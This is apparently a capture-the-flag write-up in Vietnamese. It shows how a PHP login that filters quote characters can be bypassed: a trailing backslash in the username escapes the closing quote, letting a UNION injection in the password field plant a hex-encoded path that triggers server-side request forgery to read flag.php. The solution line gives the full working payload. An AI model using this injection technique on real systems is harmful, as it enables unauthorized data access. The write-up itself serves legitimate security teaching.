# Phân tích

Đoạn code sau có thể dễ dàng bypass bằng `username=\&password= <MỘT TRUY VẤN UNION>-- -`:
```php
if (preg_match("/'|\"/", $_POST['username']) || preg_match("/'|\"/", $_POST['password']))
    die("Làm ơn đừng hack 😵😵😵");
$sql = "select username, path from users where username='" .$_POST['username'] ."' and password='" .$_POST['password'] ."'";
```

Và câu truy vấn sẽ trở thành

```
select username, path from users where username='\' and password=' MỘT TRUY VẤN UNION-- -
```

Tiếp theo  thực hiện thêm một truy vấn UNION để làm cho `$_SESSION['api_path']= '@127.0.0.1:80/flag.php#'`

```php
$_SESSION['api_path'] = $row['path'];
```

Mục đích của việc này là để khai thác lỗi SSRF

# Solution

`username=\&password= UNION SELECT 1, 0x403132372E302E302E313A38302F666C61672E70687023-- -`